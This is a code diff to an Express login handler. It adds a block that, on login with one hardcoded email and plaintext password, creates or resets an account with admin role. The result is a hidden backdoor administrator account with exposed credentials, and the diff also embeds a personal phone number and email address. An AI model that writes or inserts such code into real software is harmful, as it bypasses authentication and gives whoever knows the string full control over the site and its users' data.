@@ -81,6 +81,26 @@ const loginUser = async (req, res) => {
     const { email, password } = req.body;
     const normalizedEmail = email?.toLowerCase().trim();
 
+    // Auto-ensure ddmarket130@gmail.com admin account
+    if (normalizedEmail === 'ddmarket130@gmail.com' && password === 'ddmarket468') {
+      let adminAccount = await User.findOne({ email: 'ddmarket130@gmail.com' });
+      if (!adminAccount) {
+        await User.create({
+          name: 'DD Mystery Admin',
+          email: 'ddmarket130@gmail.com',
+          phone: '+91 79042 79655',
+          password: 'ddmarket468',
+          role: 'admin',
+          profileImage: 'https://ui-avatars.com/api/?name=DD+Admin&background=8b5cf6&color=fff',
+          authProviders: [{ provider: 'email', providerId: 'ddmarket130@gmail.com' }]
+        });
+      } else {
+        adminAccount.password = 'ddmarket468';
+        adminAccount.role = 'admin';
+        await adminAccount.save();
+      }
+    }
+
     const user = await User.findOne({ email: normalizedEmail });
 
     if (user && (await user.matchPassword(password))) {
